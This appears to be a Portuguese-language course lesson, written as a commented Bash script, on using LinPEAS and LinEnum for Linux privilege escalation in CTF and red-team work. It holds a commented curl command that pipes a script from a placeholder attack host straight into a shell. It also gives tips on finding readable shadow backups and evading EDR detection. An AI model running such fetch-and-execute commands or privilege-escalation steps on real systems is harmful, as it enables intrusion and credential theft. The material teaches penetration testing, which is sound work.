#!/bin/bash
# ==============================================================================
# Módulo 8: Ferramentas Avançadas
# Aula 02 - Automadores de Privesc Ofensivo (LinPEAS e LinEnum)
# ==============================================================================
#
# 1. ANALOGIA DO DIA A DIA
# Você aprendeu desde o Módulo 1 deste curso como caçar SUIDs na mão, 
# Ler o Sudo-l na mão, Ler os cron-jobs e capabilities de Kernel na unha...
# Isso é lindo para o aprendizado e obrigatoriedade Sênior (Saber Onde As Coisas Moram).
# Mas no "Calor de um Exame OSCP com o Crunômetro rolando" ou num "Red Team na Madrugada", 
# Nós não varremos 200 vetores localmente a mão. O Linpeas é SEU ROBOZINHO ASPIRADOR de Falhas! 
# Vc joga ele no escuro da maq alvo invadida com a shell mais lixo do mundo... Ele Vira um canivete maluco, testa milhares
# de caminhos velozmente, coleta lixos e volta cuspindo na tela TODAS AS Vias PRA ELEVAR PERMISSION 
# Destacados com cores Vermelho/Amarelas q gritam (Explora ISSO AQUI!).
#
# 2. O QUE É (definição técnica Senior)
# LinPEAS (Linux Privilege Escalation Awesome Script) é a maior script Bash Single-File do mercado hoje pra pós-exploração Linux. 
# Não tem dependencias (L.O.T.L). O LinEnum é a avó legendaria q começou e ensinou isso.
# A ferramenta emite testes de enumeração locais profundos abrangendo misconfigs de docker, PATHS, lxc lxd vulns de socket, hardcoded passwords em Caches do apt history, Sudo, e Kernel Exploits sugeriders usando heurísticas modernas.
#
# ==============================================================================
# 3. SCRIPT / COMANDO COMENTADO
# ==============================================================================

TARGET="Nao necessita IP alvo, isso aqui roda NA MAQUINA INVADIDA NA TUA SHELL!" 

# ==================== ENTREGA FURTIVA ==================== 
# Quando invadimos via Reverse Shell (nc), não quermeos gerar arquivo em HD do log via wget no /tmp pra n alarmar blueteams as vezes!
# Sêniors ativam Fileless Execution: Puxando da tua maquina atuante pela intrared via bash socket HTTP curlo diretamente pro interpretr:
echo "[*] Exemplo de Drop Fileless do Linpeas:"
# curl -L http://SEU_IP_DE_ATAQUE:8080/linpeas.sh | sh

# MODO STANDARD EM ARQUIVO (Aconselhado em CTF, porque o output é GIGANTE pra ler log na GUI):
# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/l.sh
# chmod +x /tmp/l.sh

echo "[+] Executando a Morte da Esperança Blue-Team e dumpeando txt:"
# O ideal é redirecionar Output COM as CORES ANSI inclusas usando tee -a!! E ignorar stderr lixo c/ pipe !
# /tmp/l.sh -a | tee output_peas.txt

# ==============================================================================
# 4. PASSO A PASSO
# ==============================================================================
# Passo 1: Vc está invadido como o faxineiro lá dentro. A shell tá feia.
# Passo 2: O Linpeas terminou a verborragia gigante colorida na sua tela.
# Passo 3: VOCÊ IGNORA AS COISAS CIANO OU BRANCAS (São infos operacionais estáticas).
# Passo 4: ROLE PRA CIMA NO TERMINAL LENTO procurando SOMENTE as Entradas MARCADAS COMO:
#   * LEGEND RED/YELLOW: 99% Morte Certa de Vector PrivEsc Encontrado (EXEMPLO: /usr/bin/tar TEM SUID).
#   * LEGEND RED: Muito Improvável, mnas é uma falha potencial (Ex: CVE Kernel Sugerido Dirty).
# Passo 5: No bloco de SUID destacado em Red/Yellow brilhante vc leu o TAR SUID q o script detectou usando a engine de automocão. Você so bate o olho, lembra da Aula 1 do módulo Privesc, e usa ele e foda a cx.
#
# 5. VERIFICAÇÃO E TROUBLESHOOTING
# Por que em muitos ambientes o Linpeas fica "Preso ou Congela" por mtos minutos lendo algo? A flag `-a` avamcada pode gerar lockouts pq tenta varrer discos de HD de milhares de Terabytes procurando passwords `(grep -ri senha /mnt)` e lendo configs demoradas de Nginx. Se for rapido, rode sem as flags demoradas e utilize as buscas velozes focadas em kernel/suid p/ economiza runtimes criticos.
#
# 6. CONCEITO SENIOR (o "porquê" profundo)
# Existe um motivo pro Sênior não se apoiar nele 100% como Muleta. Linpeas é BRULHENTO (Sua engine dispara 1500 comandos nativos Find ps cat locatte uname e gasta 10% cpu do alvo!). Uma solução BlueTeam de EDR e SIEM (Crowdstrike ou Elastic Defend) DETECTA UM LINPEAS rodando enbash script em 4 secundos cravados p causa dos spikes padronizados de anomalias execve behavior analisys do script q faz MTOO barulho. O Sênior Ofensivo nos redteams modernos, re-codifica pequenos scripts modulares C que caçam silenciosamente vetores de SUIDs e PAM especificamente ou inspeciona o olho pra Evardir os alarmes de SOCs Q o linpeas deflagraria na parede na cara dura. 
#
# 7. PERGUNTA DE ENTREVISTA / CTF
# Pergunta: "Seu LinPeas acusa um achado Red-Yellow maravilhoso: `[+] Readable files belonging to root and readable by me but not world readable: ... /etc/shadow.bak `. E você, faxineiro `(uid 1000 joao)` fica puto pq o `cat /etc/shadow` nativo tá fechado 600. Como q é logico isso q a shell aponto de red-yallow ali? "
# Resposta Esperada: O admin estúpido que administrava o box Linux fez bakup pra si! Ao dar `cp /etc/shadow /etc/shadow.bak`, Ele sem qrer alterou nas permissões do UMASK origiais e colocou O grupo `admin` OU um ACL pra Leitura como Default r-- pro bak.. OU DEIXOU na pasta /home do dev. O Linpeas inteligentemente não olhou o path em si, e leu inteligentemtne via FS ACLs que vc joao tem O ATRIBUTO De read especificamente validado p ele. O arquivo Bak revelou os hashes inteirinhos de senhas s ter q arrombar chroot e tu roda brute do lxd. O linpeas é mt fodastico lendo Permissoes Anormais da VFS!
